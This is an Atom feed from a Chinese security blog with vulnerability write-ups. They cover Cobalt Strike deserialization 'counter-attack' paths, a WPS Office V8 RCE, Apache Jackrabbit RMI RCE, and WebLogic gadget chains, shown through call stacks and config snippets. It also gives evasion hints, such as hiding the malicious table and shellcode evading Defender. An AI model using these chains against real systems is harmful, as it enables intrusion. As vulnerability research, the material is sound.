<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blog</title>
  
  <subtitle>written by hosch3n</subtitle>
  <link href="https://hosch3n.github.io/atom.xml" rel="self"/>
  
  <link href="https://hosch3n.github.io/"/>
  <updated>2023-08-27T11:52:17.117Z</updated>
  <id>https://hosch3n.github.io/</id>
  
  <author>
    <name>hosch3n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>某C2不鸡肋漏洞利用</title>
    <link href="https://hosch3n.github.io/2023/08/27/%E6%9F%90C2%E4%B8%8D%E9%B8%A1%E8%82%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://hosch3n.github.io/2023/08/27/%E6%9F%90C2%E4%B8%8D%E9%B8%A1%E8%82%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2023-08-27T10:18:20.000Z</published>
    <updated>2023-08-27T11:52:17.117Z</updated>
    
    <content type="html"><![CDATA[<p>懒散的周日午后，看到4ra1n师傅发了对 <a href="https://mp.weixin.qq.com/s/-Rdkv1WmYrjNWhZZK3pj6w">CVE-2023-21939的分析文章</a>，其中有两点值得关注：</p><ol><li><p>JLabel在原生反序列化流程中，会经由validateObject触发HTML解析</p></li><li><p>反序列化时低版本JDK对htmlDisabled的判断存在Bug</p></li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[JComponent#readObject -&gt; ObjectInputStream#doCallBacks -&gt; validateObject]</span><br><span class="line"> -&gt; [Swing#JLabel -&gt; Batik#setURI]</span><br></pre></td></tr></table></figure><p>我们可以进一步对接 <a href="https://hosch3n.github.io/2022/05/12/%E6%9F%90C2%E9%B8%A1%E8%82%8B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">某C2鸡肋漏洞分析</a>中，CS在登录过程中服务端与客户端均存在的反序列化入口，完成漏洞利用的拼图。</p><p><img src="/img/mc2ldfx_k.png"></p><p>不受上一轮CVE-2022-39197&lt;=4.7.1客户端RCE时的Patch影响，存在如下反制路径：</p><ol><li><p>部署RogueCS/RogueMysql/…蜜罐</p></li><li><p>反打代码执行/文件读取，获取红队客户端Shell，获取红队CS服务端密码</p></li><li><p>认证后反序列化代码执行，获取红队CS服务器Shell</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;懒散的周日午后，看到4ra1n师傅发了对 &lt;a href=&quot;https://mp.weixin.qq.com/s/-Rdkv1WmYrjNWhZZK3pj6w&quot;&gt;CVE-2023-21939的分析文章&lt;/a&gt;，其中有两点值得关注：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;JLabe</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
    <category term="CNVD-2022-45437" scheme="https://hosch3n.github.io/tags/CNVD-2022-45437/"/>
    
    <category term="CVE-2022-39197" scheme="https://hosch3n.github.io/tags/CVE-2022-39197/"/>
    
    <category term="CVE-2023-21939" scheme="https://hosch3n.github.io/tags/CVE-2023-21939/"/>
    
  </entry>
  
  <entry>
    <title>对金山WPS控件漏洞的肤浅探究</title>
    <link href="https://hosch3n.github.io/2023/08/11/%E5%AF%B9%E9%87%91%E5%B1%B1WPS%E6%8E%A7%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%82%A4%E6%B5%85%E6%8E%A2%E7%A9%B6/"/>
    <id>https://hosch3n.github.io/2023/08/11/%E5%AF%B9%E9%87%91%E5%B1%B1WPS%E6%8E%A7%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%82%A4%E6%B5%85%E6%8E%A2%E7%A9%B6/</id>
    <published>2023-08-11T08:31:07.000Z</published>
    <updated>2023-08-11T09:14:19.527Z</updated>
    
    <content type="html"><![CDATA[<p>Office与WPS支持Web控件加载HTML、CSS、<strong>JavaScript</strong>，WPS 11.1.0.12300中内嵌了没开沙盒的Chromium 87.0.4280.20，调用内嵌浏览器渲染远程HTML时执行JS，触发V8代码执行漏洞。</p><h2 id="如何触发远程加载"><a href="#如何触发远程加载" class="headerlink" title="如何触发远程加载"></a>如何触发远程加载</h2><p>原POC在大段文字中间位置，放了一个跟换行符号大小接近的动态表格，用于拉起Web控件加载与渲染远程HTML。</p><p>如果手动调整长宽为0，可以实现默认状态下完全不可见。</p><p><img src="/img/wpsrce_a.png"></p><p>但仍能通过<code>开发工具</code>-&gt;<code>XML映射窗格</code>-&gt;<code>选择窗格</code>发现蛛丝马迹。</p><p><img src="/img/wpsrce_b.png"></p><h2 id="为何有域名限制"><a href="#为何有域名限制" class="headerlink" title="为何有域名限制"></a>为何有域名限制</h2><p>通过Procmon监控，发现<code>wps.exe</code>调用了<code>WPS Office/11.1.0.12300/office6/addons/kwebextensionlist/kwebextensionlist.cfg</code></p><p>根据同目录下其他文件可以知道，动态表格的远程加载存在白名单限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[General]</span><br><span class="line">trustedDomains&#x3D;wps.cn|wpscdn.cn</span><br><span class="line">[dschart]</span><br><span class="line">trustedHosts&#x3D;clientweb.docer.wps.cn</span><br></pre></td></tr></table></figure><p>进一步可以定位到<code>WPS Office/11.1.0.12300/office6/kso.dll</code>中存在关键字，但IDA好久都没解析完这个50兆的DLL。</p><p>黑盒测试可知，只要满足<code>*wps.cn|*wpscdn.cn</code>规则的域名均被视为白名单，支持URL解码。尝试了结合一个或多个<code>@#? /\&amp;\r\n</code>等符号绕过没有成功，找了官方某个子域站的上传功能，居然禁了html真离谱啊。</p><h2 id="V8-RCE"><a href="#V8-RCE" class="headerlink" title="V8 RCE"></a>V8 RCE</h2><p>有了WPS子进程和Chrome的背书，直接替换为CS的原生shellcode也不会被defender杀。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>文档内会记录编辑者的wps帐号、Windows用户名。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><p><a href="https://official-package.wpscdn.cn/wps/download/WPS_Setup_12300.exe">WPS历史版本下载</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/office/dev/add-ins/overview/office-add-ins">Office Add-ins platform overview</a></p></li><li><p><a href="https://open.wps.cn/docs/client/wpsLoad">加载项概述</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Office与WPS支持Web控件加载HTML、CSS、&lt;strong&gt;JavaScript&lt;/strong&gt;，WPS 11.1.0.12300中内嵌了没开沙盒的Chromium 87.0.4280.20，调用内嵌浏览器渲染远程HTML时执行JS，触发V8代码执行漏洞。&lt;/</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="WPS" scheme="https://hosch3n.github.io/tags/WPS/"/>
    
  </entry>
  
  <entry>
    <title>ApacheJackrabbit漏洞浅析</title>
    <link href="https://hosch3n.github.io/2023/07/26/ApacheJackrabbit%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
    <id>https://hosch3n.github.io/2023/07/26/ApacheJackrabbit%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</id>
    <published>2023-07-26T07:13:04.000Z</published>
    <updated>2023-07-26T08:12:14.287Z</updated>
    
    <content type="html"><![CDATA[<p>Apache Jackrabbit是一个Java开源内容存储库，1.0.0 &lt;= 版本 &lt; 2.20.11、2.21.0 &lt;= 版本 &lt; 2.21.18存在RMI功能导致的远程代码执行漏洞。</p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>对比<a href="https://github.com/apache/jackrabbit/compare/jackrabbit-2.20.10...jackrabbit-2.20.11">补丁前后两个版本</a>，基本只是删掉了CB库。从<a href="https://jackrabbit.apache.org/archive/wiki/JCR/RemoteAccess_115513494.html">官方文档</a>可以知道存在RMI-over-HTTP的默认监听路径为<code>/rmi</code>。</p><p>在<code>jackrabbit-standalone-components/src/main/resources/WEB-INF/web.xml</code>中找到<code>/rmi</code>对应类：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>RMI<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/rmi<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>RMI<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.jackrabbit.servlet.remote.RemoteBindingServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/jackrabbitrce_a.png"></p><p>参考官方示例用<code>URLRemoteRepository(&quot;http://localhost:8080/rmi&quot;);</code>把Stub接下来，接口里的方法并不多，最接近Object的自然是<code>Credentials</code>。</p><p><img src="/img/jackrabbitrce_b.png"></p><p><code>Credentials</code>是一个继承<code>Serializable</code>的空接口，我们看到4个实现之一的<code>SimpleCredentials</code>：</p><p><img src="/img/jackrabbitrce_c.png"></p><p>其中<code>attributes</code>属性是一个HashMap，有Object相关的setter/getter，要素齐全对接RMI反序列化CB的PriorityQueue就行，不需要知道用户密码。</p><p><img src="/img/jackrabbitrce_e.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">423</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeMethod:<span class="number">2128</span>, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line">getSimpleProperty:<span class="number">1279</span>, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line">getNestedProperty:<span class="number">809</span>, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line">getProperty:<span class="number">885</span>, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line">getProperty:<span class="number">464</span>, PropertyUtils (org.apache.commons.beanutils)</span><br><span class="line">compare:<span class="number">163</span>, BeanComparator (org.apache.commons.beanutils)</span><br><span class="line">siftDownUsingComparator:<span class="number">722</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">688</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">737</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">797</span>, PriorityQueue (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1170</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2178</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2069</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">431</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">1409</span>, HashMap (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1170</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2178</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2069</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">2287</span>, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:<span class="number">2211</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2069</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">431</span>, ObjectInputStream (java.io)</span><br><span class="line">unmarshalValue:<span class="number">322</span>, UnicastRef (sun.rmi.server)</span><br><span class="line">unmarshalParametersUnchecked:<span class="number">628</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">unmarshalParameters:<span class="number">616</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:<span class="number">338</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:<span class="number">200</span>, Transport$<span class="number">1</span> (sun.rmi.transport)</span><br><span class="line">run:<span class="number">197</span>, Transport$<span class="number">1</span> (sun.rmi.transport)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">serviceCall:<span class="number">196</span>, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:<span class="number">573</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:<span class="number">834</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$<span class="number">0</span>:<span class="number">688</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-<span class="number">1</span>, <span class="number">679859895</span> (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$<span class="number">14</span>)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">run:<span class="number">687</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:<span class="number">1149</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Apache Jackrabbit是一个Java开源内容存储库，1.0.0 &amp;lt;= 版本 &amp;lt; 2.20.11、2.21.0 &amp;lt;= 版本 &amp;lt; 2.21.18存在RMI功能导致的远程代码执行漏洞。&lt;/p&gt;
&lt;h2 id=&quot;补丁分析&quot;&gt;&lt;a href=&quot;#补</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="CVE-2023-37895" scheme="https://hosch3n.github.io/tags/CVE-2023-37895/"/>
    
    <category term="RMI" scheme="https://hosch3n.github.io/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic安全漫谈(四)</title>
    <link href="https://hosch3n.github.io/2023/03/10/Weblogic%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2023/03/10/Weblogic%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%EF%BC%88%E5%9B%9B%EF%BC%89/</id>
    <published>2023-03-10T07:32:31.000Z</published>
    <updated>2023-04-03T07:58:43.520Z</updated>
    
    <content type="html"><![CDATA[<p>黑名单机制必然会推动两种研究方向的发展：一是挖掘不在黑名单的新组件，是为绕过规则；二是发掘检查的盲区，是为绕过逻辑。</p><h2 id="CVE-2020-14756"><a href="#CVE-2020-14756" class="headerlink" title="CVE-2020-14756"></a>CVE-2020-14756</h2><p>二次反序列化具有对抗检查逻辑的天生丽质，在<a href="https://hosch3n.github.io/2023/02/21/Weblogic%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%EF%BC%88%E4%BA%8C%EF%BC%89/#CVE-2018-2893">CVE-2018-2893</a>中就有利用字节数组和反射重建类两种方式。找找还有没有<code>readObject</code>到<code>Class.forName</code>的路子：</p><p><img src="/img/weblogicd_a.png"></p><p><code>readUnsignedByte</code>读到的<code>nType</code>为9或10时会进入<code>readXmlSerializable</code>或<code>readExternalizableLite</code>分支。</p><p><img src="/img/weblogicd_b.png"></p><p>上述两个方法均通过自身<code>loadClass</code>方法加载类，最终由<code>Class.forName</code>获取类并返回。</p><p><img src="/img/weblogicd_c.png"></p><p><img src="/img/weblogicd_d.png"></p><ul><li><code>readXmlSerializable</code>方法获取类后继续进行XML解析，是另一个XXE漏洞。</li></ul><p><code>readExternalizableLite</code>方法获取类后继续调用<code>readExternal</code>反序列化，不受黑名单限制。进而引出两个问题：</p><ol><li><p><code>ExternalizableHelper</code>自身没有实现<code>Serializable</code>接口，一定有什么地方调用它的<code>readObject</code></p></li><li><p><code>loadClass</code>加载后强转为了<code>ExternalizableLite</code>类型，它哪些满足<code>readExternal</code>参数要求的子类可以被用作sink</p></li></ol><p><img src="/img/weblogicd_e.png"></p><p>找到<code>PermissionInfo#readExternal</code>会调用<code>ExternalizableHelper#readCollection</code>进而调用<code>readObject</code>作为链首。</p><p><img src="/img/weblogicd_f.png"></p><p>继续找到<code>TopNAggregator$PartialResult</code>及其父类<code>SortedBag</code>：</p><p><img src="/img/weblogicd_g.png"></p><p><code>readExternal</code>方法会调用父类的<code>instantiateInternalMap</code>方法将<code>comparator</code>封装进<code>TreeMap</code>，随后在<code>add</code>方法中调用<code>map.put</code>时就会触发<code>compare</code>，进而连上以前的链尾。与<code>PriorityQueue</code>的作用相同，只是绕这么一圈过掉了黑名单。</p><p><img src="/img/weblogicd_h.png"></p><p>重写<code>PermissionInfo#writeExternal</code>按照以前的套路一步步构造payload打出去就行。</p><p><img src="/img/weblogicd_i.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">extract:<span class="number">95</span>, MvelExtractor (com.tangosol.coherence.rest.util.extractor)</span><br><span class="line"></span><br><span class="line">extract:<span class="number">112</span>, ReflectionExtractor (com.tangosol.util.extractor)</span><br><span class="line">extract:<span class="number">105</span>, ChainedExtractor (com.tangosol.util.extractor)</span><br><span class="line"></span><br><span class="line"><span class="comment">// extract:96, MultiExtractor (com.tangosol.util.extractor)</span></span><br><span class="line"></span><br><span class="line">compare:<span class="number">143</span>, AbstractExtractor (com.tangosol.util.extractor)</span><br><span class="line">compare:<span class="number">416</span>, SortedBag$WrapperComparator (com.tangosol.util)</span><br><span class="line">compare:<span class="number">1295</span>, TreeMap (java.util)</span><br><span class="line">put:<span class="number">538</span>, TreeMap (java.util)</span><br><span class="line">add:<span class="number">152</span>, SortedBag (com.tangosol.util)</span><br><span class="line">add:<span class="number">270</span>, TopNAggregator$PartialResult (com.tangosol.util.aggregator)</span><br><span class="line">readExternal:<span class="number">299</span>, TopNAggregator$PartialResult (com.tangosol.util.aggregator)</span><br><span class="line">readExternalizableLite:<span class="number">2345</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">readObjectInternal:<span class="number">2661</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">readObject:<span class="number">2606</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">readCollection:<span class="number">2131</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">readExternal:<span class="number">190</span>, PermissionInfo (com.tangosol.net.security)</span><br><span class="line">readExternalData:<span class="number">2118</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2067</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure><p>漏洞作者用了<code>AttributeHolder</code>作为链首，主要是<code>writeExternal</code>的逻辑友好，不用重写构造起来更加方便。</p><p><img src="/img/weblogicd_j.png"></p><h2 id="CVE-2020-14644"><a href="#CVE-2020-14644" class="headerlink" title="CVE-2020-14644"></a>CVE-2020-14644</h2><p>按照同样的思路找<code>ClassLoader.defineClass</code>的路子：</p><p><img src="/img/weblogicd_k.png"></p><p><code>com.tangosol.internal.util.invoke.RemoteConstructor#readResolve</code>会触发<code>newInstance</code>并调用<code>com.tangosol.internal.util.invoke.RemotableSupport#realize</code>。</p><p><img src="/img/weblogicd_l.png"></p><p>随后会经过多个方法处理后最终进入<code>ClassLoader.defineClass</code>，可以看到关键是最开始传入<code>RemoteConstructor</code>构造方法的<code>ClassDefinition</code>对象。</p><p><img src="/img/weblogicd_m.png"></p><p>对于字节码相关的处理函数就是获取构造方法，之后会被用于创建实例化对象，真正的关键变为了<code>ClassDefinition</code>构造方法的<code>ClassIdentity</code>对象。</p><p><img src="/img/weblogicd_n.png"></p><p><img src="/img/weblogicd_o.png"></p><p><img src="/img/weblogicd_p.png"></p><p>看到<code>ClassIdentity</code>构造函数会将包名、类名、以及md5哈希分别存入三个属性，上文中<code>RemotableSupport</code>加载字节码时，会以这个<code>getName</code>方法获取到的类名为准。</p><p><img src="/img/weblogicd_q.png"></p><p>梳理一下整体逻辑：</p><ol><li><p>将要加载的类喂给<code>ClassIdentity</code>构造函数</p></li><li><p><code>ClassDefinition</code>构造函数接收第一步创建的<code>ClassIdentity</code>对象、以及要加载的类字节码</p></li><li><p><code>RemoteConstructor</code>构造函数接收第二步创建的<code>ClassDefinition</code>对象、以及要加载的类构造函数的参数类型数组</p></li></ol><p>反序列化时就会触发类加载，要解决的核心问题是<code>ClassIdentity</code>构造函数把传给<code>ClassLoader.defineClass</code>的类名作了变化，我们也要对字节码中的类名作相应的格式变化，用asm或者javassist或者手动创建类对象都行。</p><p><img src="/img/weblogicd_r.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">defineClass:<span class="number">181</span>, RemotableSupport (com.tangosol.internal.util.invoke)</span><br><span class="line">realize:<span class="number">137</span>, RemotableSupport (com.tangosol.internal.util.invoke)</span><br><span class="line">newInstance:<span class="number">120</span>, RemoteConstructor (com.tangosol.internal.util.invoke)</span><br><span class="line">readResolve:<span class="number">231</span>, RemoteConstructor (com.tangosol.internal.util.invoke)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadResolve:<span class="number">1260</span>, ObjectStreamClass (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2078</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1573</span>, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-2135"><a href="#CVE-2021-2135" class="headerlink" title="CVE-2021-2135"></a>CVE-2021-2135</h2><p>早期对于14756的修复方法之一就是在<code>ExternalizableHelper#readExternalizableLite</code>中<code>loadClass</code>后，判断输入流属于<code>ObjectInputStream</code>就进入检查流程。这就是把找一条非<code>ObjectInputStream</code>输入流就能绕过写在脸上了;)</p><p><img src="/img/weblogicd_s.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">extract:<span class="number">95</span>, MvelExtractor (com.tangosol.coherence.rest.util.extractor)</span><br><span class="line"></span><br><span class="line">extract:<span class="number">112</span>, ReflectionExtractor (com.tangosol.util.extractor)</span><br><span class="line">extract:<span class="number">105</span>, ChainedExtractor (com.tangosol.util.extractor)</span><br><span class="line"></span><br><span class="line"><span class="comment">// extract:96, MultiExtractor (com.tangosol.util.extractor)</span></span><br><span class="line"></span><br><span class="line">compare:<span class="number">79</span>, AbstractExtractor (com.tangosol.util.extractor)</span><br><span class="line">compare:<span class="number">416</span>, SortedBag$WrapperComparator (com.tangosol.util)</span><br><span class="line">compare:<span class="number">1295</span>, TreeMap (java.util)</span><br><span class="line">put:<span class="number">538</span>, TreeMap (java.util)</span><br><span class="line">add:<span class="number">152</span>, SortedBag (com.tangosol.util)</span><br><span class="line">add:<span class="number">268</span>, TopNAggregator$PartialResult (com.tangosol.util.aggregator)</span><br><span class="line">readExternal:<span class="number">297</span>, TopNAggregator$PartialResult (com.tangosol.util.aggregator)</span><br><span class="line">readExternalizableLite:<span class="number">2265</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">readObjectInternal:<span class="number">2579</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">deserializeInternal:<span class="number">3098</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">fromBinary:<span class="number">334</span>, ExternalizableHelper (com.tangosol.util)</span><br><span class="line">getKey:<span class="number">56</span>, SimpleBinaryEntry (com.tangosol.internal.util)</span><br><span class="line">toString:<span class="number">153</span>, 